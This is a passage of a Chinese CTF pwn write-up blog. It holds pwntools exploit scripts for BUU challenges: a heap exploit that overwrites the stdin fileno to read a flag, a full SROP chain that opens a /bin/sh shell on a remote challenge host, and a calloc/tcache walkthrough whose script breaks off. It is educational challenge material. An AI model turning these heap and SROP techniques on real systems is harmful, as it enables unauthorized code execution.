<span class="token keyword">def</span> <span class="token function">debug</span><span class="token punctuation">(</span>parma<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> an_log <span class="token keyword">in</span> all_logs<span class="token punctuation">:</span>
        success<span class="token punctuation">(</span>an_log<span class="token punctuation">)</span>
    pid <span class="token operator">=</span> util<span class="token punctuation">.</span>proc<span class="token punctuation">.</span>pidof<span class="token punctuation">(</span>sh<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>pid<span class="token punctuation">,</span>parma<span class="token punctuation">)</span>
    pause<span class="token punctuation">(</span><span class="token punctuation">)</span>

choice_words <span class="token operator">=</span> <span class="token string">'> '</span>

menu_add <span class="token operator">=</span> <span class="token number">1</span>
add_index_words <span class="token operator">=</span> <span class="token string">''</span>
add_size_words <span class="token operator">=</span> <span class="token string">''</span>
add_content_words <span class="token operator">=</span> <span class="token string">'number:'</span>

menu_del <span class="token operator">=</span> <span class="token number">2</span>
del_index_words <span class="token operator">=</span> <span class="token string">''</span>

menu_show <span class="token operator">=</span> <span class="token number">3</span>
show_index_words <span class="token operator">=</span> <span class="token string">''</span>

menu_edit <span class="token operator">=</span> <span class="token number">4</span>
edit_index_words <span class="token operator">=</span> <span class="token string">'Idx: '</span>
edit_size_words <span class="token operator">=</span> <span class="token string">''</span>
edit_content_words <span class="token operator">=</span> <span class="token string">''</span>

<span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span>choice<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> content<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>choice_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>menu_add<span class="token punctuation">)</span><span class="token punctuation">)</span>
    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>choice<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> add_index_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>add_index_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> add_size_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>add_size_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> add_content_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>add_content_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>choice_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>menu_del<span class="token punctuation">)</span><span class="token punctuation">)</span>
    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>choice_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>menu_show<span class="token punctuation">)</span><span class="token punctuation">)</span>
    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> content<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>choice_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>menu_edit<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> edit_index_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>edit_index_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> edit_size_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>edit_size_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> edit_content_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>edit_content_words<span class="token punctuation">,</span> content<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">leak_info</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">:</span>
    output_log <span class="token operator">=</span> <span class="token string">'&#123;&#125; => &#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
    all_logs<span class="token punctuation">.</span>append<span class="token punctuation">(</span>output_log<span class="token punctuation">)</span>
    success<span class="token punctuation">(</span>output_log<span class="token punctuation">)</span>
debug<span class="token punctuation">(</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span>choice<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token number">0x30</span><span class="token punctuation">)</span><span class="token comment">#chunk0</span>
delete<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>
<span class="token comment">#多一些用于后续合并</span>
add<span class="token punctuation">(</span>choice<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token number">0x20</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span>choice<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token number">0x20</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span>choice<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token number">0x20</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span>choice<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token number">0x20</span><span class="token punctuation">)</span>
delete<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span>choice<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token number">0x30</span><span class="token punctuation">)</span>
delete<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span>
show<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'inode number :'</span><span class="token punctuation">)</span>
<span class="token comment">#与补码与得到低地址两字节</span>
low<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
num<span class="token operator">=</span>low<span class="token operator">&amp;</span> <span class="token number">0xFFFF</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment"># chunk0的低两字节</span>
chunk0_low2 <span class="token operator">=</span> num<span class="token operator">-</span><span class="token number">0xa0</span>
<span class="token comment">#注意看源码，只会写两个字节，这样就只覆盖了后两字节</span>
<span class="token comment">#变成了chunk0的地址(tcache中存放了指向size的地址)</span>
add<span class="token punctuation">(</span>choice<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span>content<span class="token operator">=</span>chunk0_low2<span class="token punctuation">)</span>

add<span class="token punctuation">(</span>choice<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span>content<span class="token operator">=</span>chunk0_low2<span class="token punctuation">)</span>
<span class="token comment">#篡改了chunk0的size位，大于fastbin大小，可以进入unsortbin</span>
<span class="token comment">#这里不能写成0x90，preinuse位为0的话，presize也是0x90，会触发unlink</span>
<span class="token comment">#会将tcache_prethread_struct给unlink，造成错误</span>
add<span class="token punctuation">(</span>choice<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token number">0x91</span><span class="token punctuation">)</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    delete<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>
    add<span class="token punctuation">(</span>choice<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token number">0x10</span><span class="token punctuation">)</span>
delete<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>

show<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'inode number :'</span><span class="token punctuation">)</span>
num<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span> <span class="token number">0xFFFFFFFF</span>
stdin_low4 <span class="token operator">=</span> num<span class="token operator">-</span><span class="token number">0x2a0</span>
fileno_low4 <span class="token operator">=</span> num<span class="token operator">-</span><span class="token number">0x2a0</span><span class="token operator">+</span><span class="token number">0x70</span>
<span class="token comment">#劫持_IO_2_1_stdin_结构体，修改文件描述符为666</span>
leak_info<span class="token punctuation">(</span><span class="token string">'stdin_low4'</span><span class="token punctuation">,</span>stdin_low4<span class="token punctuation">)</span>
leak_info<span class="token punctuation">(</span><span class="token string">'fileno_low4'</span><span class="token punctuation">,</span>fileno_low4<span class="token punctuation">)</span>
<span class="token comment">#此时unsortbin中存有main_arena，取出修改的后四字节，改为fileno</span>
<span class="token comment">#而同时这个在unosortbin中的chunk也在tcache中</span>
<span class="token comment">#申请后unsortbin被切割，而tcache的main_arena被修改，成为fielno地址</span>
<span class="token comment">#取出再修改为666，就可以读flag了</span>
<span class="token comment">#这里就是再做一次上面的操作，将本来在0x90中的链接入0x30中</span>
add<span class="token punctuation">(</span>choice<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>content<span class="token operator">=</span>fileno_low4<span class="token punctuation">)</span>

add<span class="token punctuation">(</span>choice<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token number">0x20</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span>choice<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token number">0x20</span><span class="token punctuation">)</span>
delete<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span>choice<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token number">0x20</span><span class="token punctuation">)</span>
delete<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>
show<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'inode number :'</span><span class="token punctuation">)</span>
<span class="token comment">#与补码与得到低地址4字节</span>
chunk0_low4<span class="token operator">=</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span> <span class="token number">0xFFFFFFFF</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x60</span>
leak_info<span class="token punctuation">(</span><span class="token string">'chunk0_low4'</span><span class="token punctuation">,</span>chunk0_low4<span class="token punctuation">)</span>

add<span class="token punctuation">(</span>choice<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>content<span class="token operator">=</span>chunk0_low4<span class="token punctuation">)</span>
add<span class="token punctuation">(</span>choice<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token number">0x10</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span>choice<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token number">0x10</span><span class="token punctuation">)</span>
<span class="token comment">#fileno覆盖写为666</span>
add<span class="token punctuation">(</span>choice<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token number">666</span><span class="token punctuation">)</span>

sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'which command?\n> '</span><span class="token punctuation">,</span> <span class="token string">'4'</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'your message :'</span><span class="token punctuation">)</span>
flag<span class="token operator">=</span>sh<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
<span class="token comment"># pause()</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>挺有意思的，国赛决赛题确实出的好</p>
<h2 id="10-BUU-rootersctf-2019-srop-srop"><a href="#10-BUU-rootersctf-2019-srop-srop" class="headerlink" title="10.BUU rootersctf_2019_srop(srop)"></a>10.BUU rootersctf_2019_srop(srop)</h2><p>64位srop，复习了一下srop，程序很简单，只有一个write和read，栈溢出，题目给了条件是srop，那就往这里想虽然没有给出系统调用号<strong>0xf</strong>，但有gadgets **pop_rax_syscall,**所以我们可以把0xf给pop到rax中并系统调用</p>
<p><img src="/images/v2-98fdd301d5fb4895853d790a86285a71_720w.png" alt="img"></p>
<p><img src="/images/v2-d3cf2f66c4b5d1a20194700efece05cd_720w.png" alt="img"></p>
<p>那接下来就很简单了，构建两次srop，一次用于read，写入/bin/sh，一次用于execve就好了：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token comment"># from ae64 import AE64</span>
<span class="token keyword">from</span> ctypes <span class="token keyword">import</span> cdll
<span class="token keyword">from</span> fallpwn <span class="token keyword">import</span> <span class="token operator">*</span>
filename <span class="token operator">=</span> <span class="token string">'./pwn'</span>
context<span class="token punctuation">.</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span>
context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span> <span class="token string">'neww'</span><span class="token punctuation">]</span>
local <span class="token operator">=</span> <span class="token number">0</span>
all_logs <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>filename<span class="token punctuation">)</span>
libc <span class="token operator">=</span> elf<span class="token punctuation">.</span>libc

<span class="token keyword">if</span> local<span class="token punctuation">:</span>
    sh <span class="token operator">=</span> process<span class="token punctuation">(</span>filename<span class="token punctuation">)</span>
<span class="token keyword">else</span><span class="token punctuation">:</span>
    sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node5.buuoj.cn'</span><span class="token punctuation">,</span><span class="token number">28583</span> <span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">debug</span><span class="token punctuation">(</span>parma<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> an_log <span class="token keyword">in</span> all_logs<span class="token punctuation">:</span>
        success<span class="token punctuation">(</span>an_log<span class="token punctuation">)</span>
    pid <span class="token operator">=</span> util<span class="token punctuation">.</span>proc<span class="token punctuation">.</span>pidof<span class="token punctuation">(</span>sh<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>pid<span class="token punctuation">,</span>parma<span class="token punctuation">)</span>
    pause<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">leak_info</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">:</span>
    output_log <span class="token operator">=</span> <span class="token string">'&#123;&#125; => &#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
    all_logs<span class="token punctuation">.</span>append<span class="token punctuation">(</span>output_log<span class="token punctuation">)</span>
    success<span class="token punctuation">(</span>output_log<span class="token punctuation">)</span>
pop_rax_syscall <span class="token operator">=</span> <span class="token number">0x401032</span>
leave_ret<span class="token operator">=</span><span class="token number">0x401035</span>
syscall <span class="token operator">=</span> <span class="token number">0x401033</span>
start <span class="token operator">=</span> <span class="token number">0x401000</span>
fake_stack <span class="token operator">=</span> <span class="token number">0x402000</span>
<span class="token comment">#read</span>
sig <span class="token operator">=</span> SigreturnFrame<span class="token punctuation">(</span><span class="token punctuation">)</span>
sig<span class="token punctuation">.</span>rax <span class="token operator">=</span> <span class="token number">0</span>
sig<span class="token punctuation">.</span>rdi <span class="token operator">=</span> <span class="token number">0</span>
sig<span class="token punctuation">.</span>rsi <span class="token operator">=</span> fake_stack
sig<span class="token punctuation">.</span>rdx <span class="token operator">=</span> <span class="token number">0x200</span>
sig<span class="token punctuation">.</span>rip <span class="token operator">=</span> syscall
sig<span class="token punctuation">.</span>rbp <span class="token operator">=</span> fake_stack<span class="token operator">+</span><span class="token number">0x10</span> <span class="token comment">#用于再次栈溢出，</span>

payload <span class="token operator">=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x88</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rax_syscall<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0xf</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">bytes</span><span class="token punctuation">(</span>sig<span class="token punctuation">)</span>
<span class="token comment"># debug('b *0x401032')</span>
sh<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'CTF?'</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>
<span class="token comment"># pause()</span>

sig1 <span class="token operator">=</span> SigreturnFrame<span class="token punctuation">(</span><span class="token punctuation">)</span>
sig1<span class="token punctuation">.</span>rax <span class="token operator">=</span> constants<span class="token punctuation">.</span>SYS_execve
sig1<span class="token punctuation">.</span>rdi <span class="token operator">=</span> fake_stack
sig1<span class="token punctuation">.</span>rsi <span class="token operator">=</span> <span class="token number">0</span>
sig1<span class="token punctuation">.</span>rdx <span class="token operator">=</span> <span class="token number">0</span>
sig1<span class="token punctuation">.</span>rip <span class="token operator">=</span> syscall
payload <span class="token operator">=</span> <span class="token string">b'/bin/sh\x00'</span><span class="token operator">+</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token operator">-</span><span class="token builtin">len</span><span class="token punctuation">(</span><span class="token string">'/bin/sh\x00'</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">)</span>
payload<span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rax_syscall<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0xf</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">bytes</span><span class="token punctuation">(</span>sig1<span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token comment"># pause()</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="11-BUU-gyctf-2020-signin-calloc利用，有点类似fastbin-reverse-into-tcache"><a href="#11-BUU-gyctf-2020-signin-calloc利用，有点类似fastbin-reverse-into-tcache" class="headerlink" title="11.BUU gyctf_2020_signin(calloc利用，有点类似fastbin reverse into tcache)"></a>11.BUU gyctf_2020_signin(calloc利用，有点类似fastbin reverse into tcache)</h2><p>2.27的一道题，没开pie ,看着是一道菜单题，没有show，但又个backdoor</p>
<p><img src="https://picx.zhimg.com/80/v2-a7a6bdf2832e295b1563a4c412a24ccb_720w.png?source=d16d100b" alt="img"></p>
<p><img src="https://pic1.zhimg.com/80/v2-7c38be7c7fb87f34a2e73691deab887d_720w.png?source=d16d100b" alt="img"></p>
<p>在ptr存在的时候就getshell了，所以很简单，修改ptr的值就好了，存在bss段上，且没开PIE，接下来就该思考怎么修改了，注意这里有一个calloc，<strong>calloc 在分配后会自动进行清空，</strong>这是一个特点，还有一点<strong>，calloc不会从tcache里申请chunk，在这道题里很重要</strong></p>
<p><img src="https://picx.zhimg.com/80/v2-a4bbe0ae2234caadf3cb47983d4dea51_720w.png?source=d16d100b" alt="img"></p>
<p>add固定大小的chunk，在fastbin范围内会用一个flag来记录</p>
<p><img src="https://picx.zhimg.com/80/v2-c7ec35dde04f6ea1833154c8f9088c58_720w.png?source=d16d100b" alt="img"></p>
<p>delete存在UAF和double free，但用不了double free，因为会被用来记录的flag给阻止</p>
<p><img src="https://pic1.zhimg.com/80/v2-51d2a5b16d23916d2565379de3c0bcd9_720w.png?source=d16d100b" alt="img"></p>
<p>edit，只能用一次，因为cnt初始值为0，用一次就小于0了</p>
<p><img src="https://pic1.zhimg.com/80/v2-6af7cf8233c1533eaaee130fc26e8753_720w.png?source=d16d100b" alt="img"></p>
<p>想一想思路，double free用不了，只能用UAF，且只能用一次，我们的目标是修改在bss上的ptr，这时候就需要用到calloc了，利用calloc不会从tcache中取的特性，首先将tcache 填满，将一个chunk释放到fastbin中，利用UAF修改这个chunk，让他的fd指针指向ptr，这样ptr就加入了fastbin中了，calloc申请出这个chunk，ptr就会被放入tcache中（提前申请一个chunk，让tcache不是满的），tcache 是后进先出，这时候ptr的fd就指向了本来就在tcache中的chunk，值就不是0了，就可以getshell了。</p>
<p><img src="https://pica.zhimg.com/80/v2-42489986ce2c4b64e72223ee55d9d00a_720w.png?source=d16d100b" alt="img"></p>
<p>此时ptr进入fastbin</p>
<p><img src="https://picx.zhimg.com/80/v2-c5301cf1e1894a8a24e03c0aa9163c20_720w.png?source=d16d100b" alt="img"></p>
<p>进入backdoor，使用一次calloc，可以看到ptr进入了tcache</p>
<p><img src="https://picx.zhimg.com/80/v2-f975e0c4aebdce1827b1d36e0e67fb48_720w.png?source=d16d100b" alt="img"></p>
<p><img src="https://pic1.zhimg.com/80/v2-ceed17a339532869fbacfca532b92de1_720w.png?source=d16d100b" alt="img"></p>
<p>成功getshell，给出exp:</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token comment">#from ae64 import AE64</span>
<span class="token keyword">from</span> ctypes <span class="token keyword">import</span> cdll

filename <span class="token operator">=</span> <span class="token string">'./pwn'</span>
context<span class="token punctuation">.</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span>
context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span> <span class="token string">'neww'</span><span class="token punctuation">]</span>
local <span class="token operator">=</span> <span class="token number">1</span>
all_logs <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>filename<span class="token punctuation">)</span>
libc <span class="token operator">=</span> elf<span class="token punctuation">.</span>libc

<span class="token keyword">if</span> local<span class="token punctuation">:</span>
    sh <span class="token operator">=</span> process<span class="token punctuation">(</span>filename<span class="token punctuation">)</span>
<span class="token keyword">else</span><span class="token punctuation">:</span>
    sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node5.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token number">29043</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">debug</span><span class="token punctuation">(</span>parma<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> an_log <span class="token keyword">in</span> all_logs<span class="token punctuation">:</span>
        success<span class="token punctuation">(</span>an_log<span class="token punctuation">)</span>
    pid <span class="token operator">=</span> util<span class="token punctuation">.</span>proc<span class="token punctuation">.</span>pidof<span class="token punctuation">(</span>sh<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>pid<span class="token punctuation">,</span>parma<span class="token punctuation">)</span>
    pause<span class="token punctuation">(</span><span class="token punctuation">)</span>

choice_words <span class="token operator">=</span> <span class="token string">'choice?'</span>

menu_add <span class="token operator">=</span> <span class="token number">1</span>
add_index_words <span class="token operator">=</span> <span class="token string">'idx?'</span>
add_size_words <span class="token operator">=</span> <span class="token string">''</span>
add_content_words <span class="token operator">=</span> <span class="token string">''</span>

menu_del <span class="token operator">=</span> <span class="token number">3</span>
del_index_words <span class="token operator">=</span> <span class="token string">'idx?'</span>

menu_show <span class="token operator">=</span> <span class="token number">33</span>
show_index_words <span class="token operator">=</span> <span class="token string">'Idx: '</span>

menu_edit <span class="token operator">=</span> <span class="token number">2</span>
edit_index_words <span class="token operator">=</span> <span class="token string">'idx?'</span>
